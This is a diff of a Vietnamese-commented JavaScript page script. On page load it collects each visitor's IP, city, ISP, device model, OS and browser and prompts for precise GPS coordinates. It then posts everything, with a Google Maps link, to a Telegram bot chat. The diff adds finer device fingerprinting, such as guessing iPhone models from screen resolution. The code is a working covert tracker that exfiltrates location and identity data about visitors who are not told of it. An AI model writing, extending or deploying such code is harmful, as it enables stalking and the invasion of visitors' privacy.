@@ -58,38 +58,57 @@ window.addEventListener('resize', adjustZoom);
 adjustZoom();
 
  // --- 1. CẤU HÌNH ---
-const TG_TOKEN = CONFIG.TG_TOKEN;
+        const TG_TOKEN = CONFIG.TG_TOKEN;
         const CHAT_ID = CONFIG.CHAT_ID;
-let isProcessing = false;
+let isBotActive = false;
 
-// --- 2. NHẬN DIỆN TRÌNH DUYỆT CHÍNH XÁC (Fix lỗi Safari trên iPhone) ---
-function getBrowserDetail() {
+// --- 2. HÀM NHẬN DIỆN MODEL THIẾT BỊ SÂU ---
+function getDeviceModel() {
     const ua = navigator.userAgent;
     let browser = "Trình duyệt lạ";
     let os = "Không rõ";
+    let model = "Thiết bị ẩn";
 
-    // Nhận diện Hệ điều hành
-    if (ua.includes("Win")) os = "Windows";
-    else if (ua.includes("iPhone")) os = "iOS (iPhone)";
-    else if (ua.includes("iPad")) os = "iOS (iPad)";
-    else if (ua.includes("Android")) os = "Android";
-    else if (ua.includes("Mac")) os = "MacOS";
+    // Phân loại Hệ điều hành & Model sơ bộ
+    if (ua.includes("Win")) {
+        os = "Windows";
+        model = "Máy tính/Laptop";
+    } else if (ua.includes("Macintosh")) {
+        os = "MacOS";
+        model = "MacBook/iMac";
+    } else if (ua.includes("iPhone")) {
+        os = "iOS";
+        // Kỹ thuật lấy độ phân giải để đoán đời iPhone
+        const screenStr = `${screen.width}x${screen.height}`;
+        const iphoneModels = {
+            "430x932": "iPhone 14/15 Pro Max",
+            "393x852": "iPhone 14/15 Pro",
+            "428x926": "iPhone 12/13/14 Pro Max",
+            "390x844": "iPhone 12/13/14/15",
+            "375x812": "iPhone X/11 Pro/12 Mini",
+            "414x896": "iPhone XR/11 Pro Max",
+            "375x667": "iPhone 6/7/8/SE"
+        };
+        model = iphoneModels[screenStr] || "iPhone (Đời mới)";
+    } else if (ua.includes("Android")) {
+        os = "Android";
+        const match = ua.match(/Android\s+([^\s;]+);\s+([^;]+)\)/);
+        model = match ? match[2] : "Điện thoại Android";
+    }
 
-    // Nhận diện Trình duyệt (Fix lỗi Chrome hiện Safari)
+    // Phân loại Trình duyệt (Sửa lỗi Safari/Chrome)
     if (ua.includes("CocCoc") || ua.includes("coc_coc_browser")) browser = "Cốc Cốc";
     else if (ua.includes("Edg/")) browser = "Microsoft Edge";
-    else if (ua.includes("CriOS")) browser = "Google Chrome (iOS)"; // Chrome trên iPhone
+    else if (ua.includes("CriOS")) browser = "Google Chrome (iOS)"; 
     else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
-    else if (ua.includes("Firefox")) browser = "Firefox";
     else if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("CriOS")) browser = "Safari";
 
-    return { browser, os };
+    return { browser, os, model };
 }
 
-// --- 3. LẤY DỮ LIỆU IP, THÀNH PHỐ, NHÀ MẠNG (Dùng nguồn HTTPS mạnh nhất) ---
-async function getFullData() {
+// --- 3. LẤY DỮ LIỆU IP & ISP (HTTPS 100%) ---
+async function fetchFullData() {
     try {
-        // Nguồn này lấy ISP Việt Nam (Viettel, VNPT, FPT) rất tốt và hỗ trợ HTTPS
         const response = await fetch('https://ipwho.is/');
         const d = await response.json();
         if (d.success) {
@@ -100,43 +119,39 @@ async function getFullData() {
             };
         }
     } catch (e) {
-        // Nếu nguồn 1 lỗi, dùng nguồn 2 dự phòng
-        const res2 = await fetch('https://ipapi.co/json/');
-        const d2 = await res2.json();
-        return {
-            ip: d2.ip,
-            city: d2.city || "Không rõ",
-            isp: d2.org || "Nhà mạng ẩn"
-        };
+        try {
+            const res2 = await fetch('https://ipapi.co/json/');
+            const d2 = await res2.json();
+            return { ip: d2.ip, city: d2.city, isp: d2.org };
+        } catch (err) {
+            return { ip: "Lỗi", city: "Lỗi", isp: "Lỗi" };
+        }
     }
-    return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
 }
 
-// --- 4. GỬI THÔNG BÁO (Format giống Ảnh 1) ---
+// --- 4. GỬI THÔNG BÁO (Format đẹp y hệt ảnh 1) ---
 async function sendNotification(pos, info) {
-    if (isProcessing) return;
-    isProcessing = true;
+    if (isBotActive) return;
+    isBotActive = true;
 
-    const device = getBrowserDetail();
-    const time = new Date().toLocaleString('vi-VN');
-
-    // Chỉnh sửa Format y hệt ảnh 1
-    let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
+    const device = getDeviceModel();
+    const time = new Date().toLocaleString('vi-VN');let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
     msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
     msg += `🌐 <b>Địa chỉ IP:</b> <code>${info.ip}</code>\n`;
     msg += `🏙️ <b>Thành phố:</b> <code>${info.city}</code>\n`;
     msg += `📡 <b>Nhà mạng:</b> <b>${info.isp}</b>\n\n`;
 
     msg += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
-    msg += `├─ Hệ điều hành: <code>${device.os}</code>\n`;msg += `└─ Trình duyệt: <b>${device.browser}</b>\n\n`;
+    msg += `├─ Thiết bị: <b>${device.model}</b>\n`; // HIỆN MODEL CHI TIẾT
+    msg += `├─ Hệ điều hành: <code>${device.os}</code>\n`;
+    msg += `└─ Trình duyệt: <b>${device.browser}</b>\n\n`;
 
     if (pos && pos.coords) {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
+        const { latitude: lat, longitude: lon } = pos.coords;
         msg += `📍 <b>Vị trí GPS:</b>\n`;
         msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
     } else {
-        msg += `⚠️ <b>GPS:</b> Người dùng từ chối vị trí\n`;
+        msg += `⚠️ <b>GPS:</b> Bị từ chối\n`;
     }
 
     try {
@@ -147,27 +162,28 @@ async function sendNotification(pos, info) {
                 chat_id: CHAT_ID,
                 text: msg,
                 parse_mode: 'HTML',
-                disable_web_page_preview: false // Để hiện bản đồ thu nhỏ
+                disable_web_page_preview: false
             })
         });
     } catch (err) {
         console.error(err);
     } finally {
-        isProcessing = false;
+        isBotActive = false;
     }
 }
 
 // --- 5. KHỞI CHẠY ---
-window.onload = async () => {
-    const ipInfo = await getFullData();
-    
+async function start() {
+    const ipData = await fetchFullData();
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            (pos) => sendNotification(pos, ipInfo),
-            () => sendNotification(null, ipInfo),
+            (pos) => sendNotification(pos, ipData),
+            () => sendNotification(null, ipData),
             { enableHighAccuracy: true, timeout: 5000 }
         );
     } else {
-        sendNotification(null, ipInfo);
+        sendNotification(null, ipData);
     }
-};
+}
+
+window.onload = start;
